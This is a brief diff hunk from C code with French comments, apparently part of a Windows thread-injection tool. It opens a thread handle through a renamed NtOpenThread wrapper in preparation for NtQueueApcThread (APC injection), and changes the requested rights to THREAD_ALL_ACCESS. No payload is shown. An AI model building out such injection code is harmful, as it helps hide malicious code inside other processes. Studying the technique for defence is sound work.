@@ -143,7 +143,7 @@ int main(int argc, char* argv[]) {
     // THREAD_SET_CONTEXT requis par NtQueueApcThread.
     // THREAD_SUSPEND_RESUME au cas où, pour compat.
     st = Qn3_NtOpenThread(&hThr,
-        THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT,
+        THREAD_ALL_ACCESS,
         &oa, &cid);
     DBG("[*] NtOpenThread = 0x%08lX, handle=%p\n", st, hThr);
     if (st != 0 || !hThr) goto cleanup;
